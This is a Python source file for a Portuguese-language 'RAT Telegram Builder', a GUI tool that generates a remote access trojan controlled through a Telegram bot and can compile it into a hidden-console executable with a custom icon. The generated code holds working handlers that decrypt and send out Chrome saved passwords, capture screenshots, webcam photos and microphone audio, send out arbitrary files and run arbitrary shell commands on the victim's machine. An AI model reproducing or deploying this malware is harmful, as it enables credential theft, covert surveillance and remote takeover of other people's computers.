# ============================================
# RAT TELEGRAM BUILDER v1.3 
# Autor: LIMAX DEV
# ============================================

import telebot
import os
import sys
import random
import pyttsx3
import pyautogui
import cv2
import json
import ctypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import time
import stat
import numpy as np
import shutil
from pynput import keyboard
from datetime import datetime, timedelta
import customtkinter as ctk
import tkinter
from tkinter import filedialog, messagebox
import subprocess
import threading
import zipfile

# ================================
# CONFIGURAÇÕES DO BUILDER
# ================================

class RATBuilder:
    def __init__(self):
        self.version = "1.3"
        self.author = "LIMAX DEV"
        
        # Configuração de cores
        self.colors = {
            "background": "#0a0a0a",
            "dark_gray": "#1a1a1a",
            "gray": "#2a2a2a",
            "light_gray": "#3a3a3a",
            "red": "#ff0033",
            "dark_red": "#cc0029",
            "green": "#00ff88",
            "blue": "#0099ff",
            "white": "#ffffff"
        }
        
        # Variáveis de configuração
        self.token = ""
        self.output_name = "RAT_Telegram"
        self.icon_path = ""
        self.build_type = "Python"
        
        # Opções do RAT (todas desativadas por padrão)
        self.options = {
            # Comandos Básicos
            "start": "enable",
            "help": "disable",
            "addstartup": "disable",
            "deletestartup": "disable",
            "keylogger": "disable",
            "stopkeylogger": "disable",
            "run": "disable",
            "users": "disable",
            "whoami": "disable",
            "tasklist": "disable",
            "taskkill": "disable",
            "sleep": "disable",
            "shutdown": "disable",
            "restart": "disable",
            "altf4": "disable",
            "cmdbomb": "disable",
            "msg": "disable",
            
            # Segurança & Privacidade
            "passwords": "disable",
            "wallpaper": "disable",
            "disabletaskmgr": "disable",
            "enabletaskmgr": "disable",
            "winblocker": "disable",
            "winblocker2": "disable",
            
            # Gerenciamento de Dispositivo
            "screenshot": "disable",
            "webscreen": "disable",
            "webcam": "disable",
            "screenrecord": "disable",
            "block": "disable",
            "unblock": "disable",
            "mousemesstart": "disable",
            "mousemesstop": "disable",
            "mousekill": "disable",
            "mousestop": "disable",
            "mousemove": "disable",
            "mouseclick": "disable",
            "mouseright": "disable",
            "fullvolume": "disable",
            "volumeplus": "disable",
            "volumeminus": "disable",
            "maximize": "disable",
            "minimize": "disable",
            
            # Rede
            "wifilist": "disable",
            "wifipass": "disable",
            "chrome": "disable",
            "edge": "disable",
            "firefox": "disable",
            
            # Multimídia
            "textspech": "disable",
            "playsound": "disable",
            "download": "disable",
            "upload": "disable",
            "clipboard": "disable",
            "changeclipboard": "disable",
            "mic": "disable",  # NOVO: Gravação de áudio do microfone
            
            # Operações Avançadas
            "e": "disable",
            "ex": "disable",
            "execute": "disable",
            "metadata": "disable",
            "keytype": "disable",
            "keypress": "disable",
            "keypresstwo": "disable",
            "keypressthree": "disable",
            "hide": "disable",
            "unhide": "disable",
            
            # Informações do Sistema
            "info": "disable",
            "pcinfo": "disable",
            "shortinfo": "disable",
            "apps": "disable",
            "batteryinfo": "disable",
            
            # Exemplos e Social
            "examples": "disable",
            "github": "disable",
            
            # NOVO: Extração de Dados do Browser
            # REMOVIDOS conforme solicitado:
            "browser_data": "disable",
            "get_passwords": "disable",
            "get_cookies": "disable",
            "get_history": "disable",
            "get_downloads": "disable",
            "get_cards": "disable",
            "get_extensions": "disable"
        }
        
        # Configuração da janela
        self.builder = ctk.CTk()
        self.setup_ui()
    
    def setup_ui(self):
        """Configura a interface gráfica do builder"""
        self.builder.title(f"RAT Builder v{self.version} - LIMAX DEV")
        self.builder.geometry("1100x900")
        self.builder.resizable(False, False)
        self.builder.configure(fg_color=self.colors["background"])
        
        # Título
        title_frame = ctk.CTkFrame(self.builder, width=1080, height=80, fg_color=self.colors["dark_gray"])
        title_frame.pack(pady=10, padx=10, fill="x")
        title_frame.pack_propagate(False)
        
        title = ctk.CTkLabel(title_frame, text="🐀 RAT Telegram Builder", 
                            font=ctk.CTkFont(family="Helvetica", size=28, weight="bold"),
                            text_color=self.colors["red"])
        title.pack(pady=20)
        
        subtitle = ctk.CTkLabel(title_frame, text="Selecione as funcionalidades que deseja incluir no RAT",
                               font=ctk.CTkFont(family="Helvetica", size=12),
                               text_color=self.colors["white"])
        subtitle.pack(pady=(0, 10))
        
        # Configurações básicas
        config_frame = ctk.CTkFrame(self.builder, width=1080, height=120, fg_color=self.colors["dark_gray"])
        config_frame.pack(pady=5, padx=10, fill="x")
        config_frame.pack_propagate(False)
        
        # Token do bot
        token_label = ctk.CTkLabel(config_frame, text="Token do Bot Telegram:",
                                  font=ctk.CTkFont(family="Helvetica", size=12),
                                  text_color=self.colors["white"])
        token_label.grid(row=0, column=0, padx=20, pady=10, sticky="w")
        
        self.token_entry = ctk.CTkEntry(config_frame, width=400, height=35,
                                       font=ctk.CTkFont(family="Helvetica", size=12),
                                       placeholder_text="Ex: 1234567891:AAAGGGMQJt9qlq8sSMRY1aUNOCl0gA27_HY",
                                       fg_color=self.colors["gray"],
                                       border_color=self.colors["red"])
        self.token_entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")
        
        # Nome do arquivo
        name_label = ctk.CTkLabel(config_frame, text="Nome do Arquivo:",
                                 font=ctk.CTkFont(family="Helvetica", size=12),
                                 text_color=self.colors["white"])
        name_label.grid(row=1, column=0, padx=20, pady=10, sticky="w")
        
        self.name_entry = ctk.CTkEntry(config_frame, width=200, height=35,
                                      font=ctk.CTkFont(family="Helvetica", size=12),
                                      placeholder_text="Ex: MyRAT",
                                      fg_color=self.colors["gray"],
                                      border_color=self.colors["red"])
        self.name_entry.grid(row=1, column=1, padx=10, pady=10, sticky="w")
        
        # Tipo de build
        type_label = ctk.CTkLabel(config_frame, text="Tipo de Build:",
                                 font=ctk.CTkFont(family="Helvetica", size=12),
                                 text_color=self.colors["white"])
        type_label.grid(row=0, column=2, padx=20, pady=10, sticky="w")
        
        self.build_type_var = ctk.StringVar(value="Python")
        self.build_type_menu = ctk.CTkOptionMenu(config_frame, width=150, height=35,
                                                values=["Python", "EXE"],
                                                variable=self.build_type_var,
                                                fg_color=self.colors["gray"],
                                                button_color=self.colors["red"],
                                                button_hover_color=self.colors["dark_red"])
        self.build_type_menu.grid(row=0, column=3, padx=10, pady=10, sticky="w")
        
        # Botão para selecionar ícone
        self.icon_button = ctk.CTkButton(config_frame, text="Selecionar Ícone (.ico)",
                                        width=150, height=35,
                                        command=self.select_icon,
                                        fg_color=self.colors["gray"],
                                        hover_color=self.colors["light_gray"],
                                        text_color=self.colors["white"])
        self.icon_button.grid(row=1, column=3, padx=10, pady=10, sticky="w")
        
        # Frame principal com scroll
        main_frame = ctk.CTkScrollableFrame(self.builder, width=1080, height=550,
                                           fg_color=self.colors["dark_gray"])
        main_frame.pack(pady=5, padx=10, fill="both", expand=True)
        
        # Criar checkboxes para cada categoria
        categories = [
            ("🛠️ Comandos Básicos", [
                "start", "help", "addstartup", "deletestartup",
                "keylogger", "stopkeylogger", "run", "users",
                "whoami", "tasklist", "taskkill", "sleep",
                "shutdown", "restart", "altf4", "cmdbomb", "msg"
            ]),
            
            ("🔒 Segurança & Privacidade", [
                "passwords", "wallpaper", "disabletaskmgr",
                "enabletaskmgr", "winblocker", "winblocker2"
            ]),
            
            ("📱 Gerenciamento de Dispositivo", [
                "screenshot", "webscreen", "webcam", "screenrecord",
                "block", "unblock", "mousemesstart", "mousemesstop",
                "mousekill", "mousestop", "mousemove", "mouseclick",
                "mouseright", "fullvolume", "volumeplus", "volumeminus",
                "maximize", "minimize"
            ]),
            
            ("🌐 Rede", [
                "wifilist", "wifipass", "chrome", "edge", "firefox"
            ]),
            
            ("🎶 Multimídia", [
                "textspech", "playsound", "download", "upload",
                "clipboard", "changeclipboard", "mic"  # MIC adicionado aqui
            ]),
            
            ("⚙️ Operações Avançadas", [
                "e", "ex", "execute", "metadata", "keytype",
                "keypress", "keypresstwo", "keypressthree",
                "hide", "unhide"
            ]),
            
            ("🖥️ Informações do Sistema", [
                "info", "pcinfo", "shortinfo", "apps", "batteryinfo"
            ]),
            
            ("📱 Social & Exemplos", [
                "examples", "github"
            ])
        ]
        
        # Checkboxes por categoria
        row = 0
        self.checkboxes = {}
        
        for category_name, commands in categories:
            # Cabeçalho da categoria
            category_label = ctk.CTkLabel(main_frame, text=category_name,
                                         font=ctk.CTkFont(family="Helvetica", size=14, weight="bold"),
                                         text_color=self.colors["green"])
            category_label.grid(row=row, column=0, columnspan=4, 
                               padx=20, pady=(15, 5), sticky="w")
            row += 1
            
            # Botão para selecionar todos
            select_all_btn = ctk.CTkButton(main_frame, text="✓ Selecionar Todos",
                                          width=120, height=30,
                                          command=lambda cmds=commands: self.select_all_commands(cmds),
                                          fg_color=self.colors["gray"],
                                          hover_color=self.colors["light_gray"])
            select_all_btn.grid(row=row, column=0, padx=20, pady=5, sticky="w")
            
            # Botão para desmarcar todos
            deselect_all_btn = ctk.CTkButton(main_frame, text="✗ Desmarcar Todos",
                                            width=120, height=30,
                                            command=lambda cmds=commands: self.deselect_all_commands(cmds),
                                            fg_color=self.colors["gray"],
                                            hover_color=self.colors["light_gray"])
            deselect_all_btn.grid(row=row, column=1, padx=5, pady=5, sticky="w")
            row += 1
            
            # Checkboxes individuais
            col = 0
            for i, command in enumerate(commands):
                var = ctk.StringVar(value="disable")
                # O comando start sempre deve estar ativo
                if command == "start":
                    var.set("enable")
                
                checkbox = ctk.CTkCheckBox(main_frame, text=f"/{command}",
                                          variable=var,
                                          onvalue="enable",
                                          offvalue="disable",
                                          fg_color=self.colors["red"],
                                          hover_color=self.colors["dark_red"],
                                          border_color=self.colors["red"],
                                          text_color=self.colors["white"])
                
                checkbox.grid(row=row, column=col, padx=20, pady=5, sticky="w")
                self.checkboxes[command] = var
                
                col += 1
                if col >= 4:
                    col = 0
                    row += 1
            
            if col != 0:
                row += 1
        
        # Frame de botões
        button_frame = ctk.CTkFrame(self.builder, width=1080, height=80, fg_color=self.colors["dark_gray"])
        button_frame.pack(pady=10, padx=10, fill="x")
        button_frame.pack_propagate(False)
        
        # Botão Build
        build_btn = ctk.CTkButton(button_frame, text="🚀 CONSTRUIR RAT",
                                 width=200, height=50,
                                 command=self.build_rat,
                                 font=ctk.CTkFont(family="Helvetica", size=16, weight="bold"),
                                 fg_color=self.colors["red"],
                                 hover_color=self.colors["dark_red"])
        build_btn.pack(pady=15)
        
        # Status
        self.status_label = ctk.CTkLabel(button_frame, text="Pronto para construir...",
                                        font=ctk.CTkFont(family="Helvetica", size=12),
                                        text_color=self.colors["white"])
        self.status_label.pack(pady=5)
    
    def select_icon(self):
        """Seleciona um ícone para o executável"""
        file_path = filedialog.askopenfilename(
            title="Selecionar Ícone",
            filetypes=[("Icon files", "*.ico")]
        )
        if file_path:
            self.icon_path = file_path
            self.icon_button.configure(text="Ícone Selecionado",
                                      fg_color=self.colors["green"])
    
    def select_all_commands(self, commands):
        """Marca todos os comandos de uma categoria"""
        for command in commands:
            if command in self.checkboxes:
                self.checkboxes[command].set("enable")
    
    def deselect_all_commands(self, commands):
        """Desmarca todos os comandos de uma categoria"""
        for command in commands:
            if command in self.checkboxes and command != "start":  # Não desmarca o start
                self.checkboxes[command].set("disable")
    
    def update_status(self, message, color=None):
        """Atualiza a mensagem de status"""
        self.status_label.configure(text=message)
        if color:
            self.status_label.configure(text_color=color)
    
    def build_rat(self):
        """Constrói o RAT com as opções selecionadas"""
        # Coletar configurações
        self.token = self.token_entry.get().strip()
        self.output_name = self.name_entry.get().strip() or "RAT_Telegram"
        self.build_type = self.build_type_var.get()
        
        # Validar token
        if not self.token:
            messagebox.showerror("Erro", "Por favor, insira o token do bot Telegram!")
            return
        
        # Atualizar opções
        for command, var in self.checkboxes.items():
            self.options[command] = var.get()
        
        # Contar comandos ativados
        enabled_commands = sum(1 for cmd in self.options.values() if cmd == "enable")
        
        # Confirmar construção
        confirm = messagebox.askyesno(
            "Confirmar Construção",
            f"Configuração do RAT:\n\n"
            f"• Token: {self.token[:20]}...\n"
            f"• Nome: {self.output_name}\n"
            f"• Tipo: {self.build_type}\n"
            f"• Comandos ativados: {enabled_commands}/60\n\n"
            f"Deseja construir o RAT?"
        )
        
        if not confirm:
            return
        
        # Iniciar construção
        self.update_status("Construindo RAT...", self.colors["green"])
        self.builder.update()
        
        try:
            # Criar arquivo Python
            python_code = self.generate_python_code()
            
            # Salvar arquivo Python
            python_file = f"{self.output_name}.py"
            with open(python_file, "w", encoding="utf-8") as f:
                f.write(python_code)
            
            self.update_status(f"Arquivo Python criado: {python_file}", self.colors["green"])
            
            # Se for EXE, converter
            if self.build_type == "EXE":
                self.update_status("Convertendo para EXE...", self.colors["green"])
                self.convert_to_exe(python_file)
            
            self.update_status("✅ RAT construído com sucesso!", self.colors["green"])
            messagebox.showinfo("Sucesso", f"RAT construído com sucesso!\n\nArquivo: {self.output_name}.{'.exe' if self.build_type == 'EXE' else 'py'}")
            
        except Exception as e:
            self.update_status(f"❌ Erro: {str(e)}", self.colors["red"])
            messagebox.showerror("Erro", f"Ocorreu um erro ao construir o RAT:\n\n{str(e)}")
    
    def convert_to_exe(self, python_file):
        """Converte o arquivo Python para EXE usando PyInstaller"""
        try:
            # Instalar/atualizar pyinstaller se necessário
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "--upgrade", "--quiet"])
            
            # Comando pyinstaller
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name", self.output_name,
                python_file
            ]
            
            # Adicionar ícone se especificado
            if self.icon_path and os.path.exists(self.icon_path):
                cmd.extend(["--icon", self.icon_path])
            
            # Adicionar imports ocultos necessários
            cmd.extend(["--hidden-import", "telebot"])
            cmd.extend(["--hidden-import", "pyttsx3"])
            cmd.extend(["--hidden-import", "pyautogui"])
            cmd.extend(["--hidden-import", "cv2"])
            cmd.extend(["--hidden-import", "Cryptodome.Cipher.AES"])
            cmd.extend(["--hidden-import", "pynput.keyboard"])
            cmd.extend(["--hidden-import", "win32crypt"])
            cmd.extend(["--hidden-import", "win32clipboard"])
            cmd.extend(["--hidden-import", "psutil"])
            cmd.extend(["--hidden-import", "cryptography"])
            cmd.extend(["--hidden-import", "zipfile"])
            cmd.extend(["--hidden-import", "sounddevice"])  # Para o comando /mic
            cmd.extend(["--hidden-import", "soundfile"])    # Para o comando /mic
            
            # Executar pyinstaller
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Remover arquivos temporários
            if os.path.exists("build"):
                shutil.rmtree("build")
            if os.path.exists(f"{self.output_name}.spec"):
                os.remove(f"{self.output_name}.spec")
            
            # Mover executável para diretório atual
            if os.path.exists(os.path.join("dist", f"{self.output_name}.exe")):
                shutil.move(os.path.join("dist", f"{self.output_name}.exe"), ".")
                if os.path.exists("dist"):
                    shutil.rmtree("dist")
            
        except subprocess.CalledProcessError as e:
            raise Exception(f"Erro ao converter para EXE: {str(e)}")
        except Exception as e:
            raise Exception(f"Erro: {str(e)}")
    
    def generate_python_code(self):
        """Gera o código Python do RAT com base nas opções selecionadas"""
        
        # Cabeçalho do código
        code = '''# ============================================
# RAT Telegram - Construído com RAT Builder
# Autor: LIMAX DEV
# Versão: 1.3
# COMANDO /mic ADICIONADO
# ============================================

import telebot
import os
import sys
import time
'''
        
        # Adicionar imports condicionais
        imports = {
            "random": ["mousemesstart", "mousemesstop", "cmdbomb"],
            "pyttsx3": ["textspech"],
            "pyautogui": [
                "screenshot", "screenrecord", "block", "unblock",
                "mousemesstart", "mousemesstop", "mousekill", "mousestop",
                "mousemove", "mouseclick", "mouseright", "fullvolume",
                "volumeplus", "volumeminus", "maximize", "minimize",
                "altf4", "keytype", "keypress", "keypresstwo", "keypressthree"
            ],
            "cv2": ["webscreen", "webcam", "screenrecord"],
            "json": ["passwords"],
            "ctypes": ["clipboard", "changeclipboard", "block", "unblock", "wallpaper", "sleep"],
            "base64": ["passwords"],
            "sqlite3": ["passwords"],
            "win32crypt": ["passwords"],
            "Cryptodome.Cipher": ["passwords"],
            "numpy": ["screenrecord"],
            "shutil": ["passwords", "download", "upload"],
            "pynput.keyboard": ["keylogger", "stopkeylogger"],
            "datetime": ["passwords"],
            "sounddevice": ["mic"],  # Para gravação de áudio
            "soundfile": ["mic"]     # Para salvar arquivo de áudio
        }
        
        # Adicionar imports necessários
        added_imports = set()
        for module, commands in imports.items():
            for cmd in commands:
                if self.options.get(cmd) == "enable":
                    if module not in added_imports:
                        if module == "Cryptodome.Cipher":
                            code += "from Cryptodome.Cipher import AES\n"
                        elif module == "pynput.keyboard":
                            code += "from pynput import keyboard\n"
                        elif module == "datetime":
                            code += "from datetime import datetime, timedelta\n"
                        elif module == "sounddevice":
                            code += "import sounddevice as sd\n"
                        elif module == "soundfile":
                            code += "import soundfile as sf\n"
                        else:
                            code += f"import {module}\n"
                        added_imports.add(module)
                    break
        
        # Adicionar imports específicos para certas funcionalidades
        if self.options.get("clipboard") == "enable" or self.options.get("changeclipboard") == "enable":
            if "win32clipboard" not in added_imports:
                code += "import win32clipboard\n"
                added_imports.add("win32clipboard")
        
        if self.options.get("info") == "enable":
            if "socket" not in added_imports:
                code += "import socket\n"
                added_imports.add("socket")
            if "requests" not in added_imports:
                code += "import requests\n"
                added_imports.add("requests")
        
        code += "\n"
        
        # Inicializar bot
        code += f'''# Inicializar o bot
bot = telebot.TeleBot('{self.token}')

# Variáveis globais
user_state = {{}}
end_keylogger = 0
mousekill = 42
mousemess = 42
execute_enabled = False
waiting_for_upload = False
current_directory = os.getcwd()

'''
        
        # Adicionar funções auxiliares necessárias para passwords (do código original)
        if self.options["passwords"] == "enable":
            code += '''def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

'''
        
        # Adicionar handler de start (sempre ativo)
        code += '''@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "✅ Conexão estabelecida!")
    result = os.popen('whoami').read().strip()
    bot.send_message(message.chat.id, f'🔧 PC conectado: {result}')
    bot.send_message(message.chat.id, '📋 Use /help para ver comandos disponíveis')

'''
        
        # Adicionar handler para o comando /mic
        if self.options["mic"] == "enable":
            code += '''@bot.message_handler(commands=['mic'])
def record_audio(message):
    """Grava áudio do microfone por 30 segundos e envia"""
    try:
        import sounddevice as sd
        import soundfile as sf
        import numpy as np
        
        # Verificar se há tempo específico no comando
        command_parts = message.text.split()
        if len(command_parts) > 1:
            try:
                record_time = int(command_parts[1])
                if record_time > 300:  # Limite de 5 minutos
                    record_time = 300
                    bot.send_message(message.chat.id, "⚠️ Tempo limitado a 5 minutos por segurança")
            except ValueError:
                record_time = 30
                bot.send_message(message.chat.id, "⚠️ Tempo inválido, usando padrão de 30 segundos")
        else:
            record_time = 30
        
        # Configurações de gravação
        samplerate = 44100  # Taxa de amostragem
        channels = 2        # Estéreo
        
        bot.send_message(message.chat.id, f"🎤 Gravando áudio por {record_time} segundos...")
        
        # Gravar áudio
        recording = sd.rec(int(record_time * samplerate), 
                          samplerate=samplerate, 
                          channels=channels, 
                          dtype='float32')
        sd.wait()  # Aguardar gravação terminar
        
        bot.send_message(message.chat.id, "✅ Gravação concluída! Processando...")
        
        # Salvar arquivo temporário
        temp_filename = f"audio_recording_{int(time.time())}.wav"
        sf.write(temp_filename, recording, samplerate)
        
        # Enviar arquivo de áudio
        with open(temp_filename, 'rb') as audio_file:
            bot.send_audio(message.chat.id, audio_file, caption=f"🎤 Gravação de {record_time} segundos")
        
        # Remover arquivo temporário
        os.remove(temp_filename)
        bot.send_message(message.chat.id, "✅ Áudio enviado com sucesso!")
        
    except Exception as e:
        error_msg = f"❌ Erro na gravação de áudio: {str(e)}"
        bot.send_message(message.chat.id, error_msg)
        
'''
        
        # Adicionar handlers baseados nas opções selecionadas
        # Primeiro, handlers básicos essenciais
        if self.options["help"] == "enable":
            code += '''@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = "📚 COMANDOS DISPONÍVEIS\\n\\n"
    
    help_text += "🛠️ COMANDOS BÁSICOS\\n"
    help_text += "/start - Iniciar conexão\\n"
    help_text += "/help - Mostrar esta ajuda\\n"
    help_text += "/whoami - Mostrar usuário do PC\\n"
    help_text += "/users - Mostrar usuários do sistema\\n"
    help_text += "/tasklist - Listar processos\\n"
    help_text += "/taskkill - Encerrar processo\\n"
    help_text += "/shutdown - Desligar PC\\n"
    help_text += "/restart - Reiniciar PC\\n"
    help_text += "/sleep - Suspender PC\\n"
    
    help_text += "\\n🔒 SEGURANÇA\\n"
    help_text += "/passwords - Mostrar senhas do Chrome\\n"
    help_text += "/keylogger - Iniciar keylogger\\n"
    help_text += "/stopkeylogger - Parar keylogger\\n"
    
    help_text += "\\n📱 CONTROLE\\n"
    help_text += "/screenshot - Capturar tela\\n"
    help_text += "/webcam - Foto da webcam\\n"
    help_text += "/mic - Gravar áudio do microfone (30s)\\n"
    help_text += "/mousemove - Mover mouse\\n"
    help_text += "/keytype - Digitar texto\\n"
    
    help_text += "\\n💻 SISTEMA\\n"
    help_text += "/e - Executar comando\\n"
    help_text += "/info - Informações do PC\\n"
    help_text += "/download - Baixar arquivo\\n"
    help_text += "/upload - Enviar arquivo\\n"
    
    bot.send_message(message.chat.id, help_text)
'''
        
        # Adicionar handler para passwords
        if self.options["passwords"] == "enable":
            code += '''
@bot.message_handler(commands=['passwords'])
def send_passwords(message):
    bot.send_message(message.chat.id, "🔍 Buscando senhas do Chrome...")
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        data_to_send = ""
        
        password_count = 0
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            
            if username or password:
                password_count += 1
                data_to_send += f"=== SENHA {password_count} ===\\n"
                data_to_send += f"Site: {origin_url}\\n"
                data_to_send += f"URL Ação: {action_url}\\n"
                data_to_send += f"Usuário: {username}\\n"
                data_to_send += f"Senha: {password}\\n"
                
                if date_created != 86400000000 and date_created:
                    data_to_send += f"Data de Criação: {str(get_chrome_datetime(date_created))}\\n"
                if date_last_used != 86400000000 and date_last_used:
                    data_to_send += f"Último Uso: {str(get_chrome_datetime(date_last_used))}\\n"
                
                data_to_send += "=" * 50 + "\\n\\n"
        
        cursor.close()
        db.close()
        
        try:
            os.remove(filename)
        except Exception as e:
            print(f"Erro ao deletar arquivo: {e}")
        
        if data_to_send:
            if len(data_to_send) > 4000:
                with open("passwords.txt", "w", encoding="utf-8") as file:
                    file.write(data_to_send)
                with open("passwords.txt", "rb") as file:
                    bot.send_document(message.chat.id, file)
                os.remove('passwords.txt')
                bot.send_message(message.chat.id, f"✅ Encontradas {password_count} senhas (arquivo enviado)")
            else:
                if password_count > 0:
                    bot.send_message(message.chat.id, f"✅ Encontradas {password_count} senhas:\\n\\n{data_to_send}")
                else:
                    bot.send_message(message.chat.id, "⚠️ Nenhuma senha encontrada.")
        else:
            bot.send_message(message.chat.id, "⚠️ Nenhuma senha encontrada.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Adicionar handlers básicos para comandos essenciais
        if self.options["whoami"] == "enable":
            code += '''
@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    try:
        result = os.popen('whoami').read().strip()
        bot.send_message(message.chat.id, f"👤 Usuário: {result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        if self.options["screenshot"] == "enable":
            code += '''
@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove("screenshot.png")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        if self.options["webcam"] == "enable":
            code += '''
@bot.message_handler(commands=['webcam'])
def take_webcam_photo(message):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            with open("webcam.jpg", "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove("webcam.jpg")
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        if self.options["download"] == "enable":
            code += '''
@bot.message_handler(commands=['download'])
def download_file(message):
    try:
        file_path = message.text.split('/download', 1)[1].strip()
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                    bot.send_photo(message.chat.id, file)
                elif file_path.lower().endswith(('.mp4', '.avi', '.mov')):
                    bot.send_video(message.chat.id, file)
                elif file_path.lower().endswith(('.mp3', '.wav')):
                    bot.send_audio(message.chat.id, file)
                else:
                    bot.send_document(message.chat.id, file)
            bot.send_message(message.chat.id, f"📁 Arquivo enviado: {file_path}")
        else:
            bot.send_message(message.chat.id, f"❌ Arquivo não encontrado: {file_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        if self.options["e"] == "enable":
            code += '''
@bot.message_handler(commands=['e'])
def execute_command_short(message):
    try:
        command = message.text.split('/e', 1)[1].strip()
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"📁 Diretório: {parent_directory}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"📁 Diretório: {os.getcwd()}")
        else:
            result = os.popen(command).read()
            if len(result) > 4000:
                result = result[:4000] + "..."
            bot.send_message(message.chat.id, f"💻 Resultado:\\n{result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Adicionar polling
        code += '''
if __name__ == "__main__":
    print("🤖 RAT Telegram iniciado...")
    print("📞 Aguardando comandos...")
    bot.polling(none_stop=True)
'''
        
        return code
    
    def run(self):
        """Executa o builder"""
        self.builder.mainloop()


# ================================
# EXECUÇÃO PRINCIPAL
# ================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║         🐀 RAT TELEGRAM BUILDER          ║ 
    ║            by LIMAX DEV                  ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Verificar e instalar dependências necessárias
    try:
        import customtkinter
    except ImportError:
        print("Instalando customtkinter...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"])
    
    try:
        import telebot
    except ImportError:
        print("Instalando pyTelegramBotAPI...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    
    builder = RATBuilder()
    builder.run()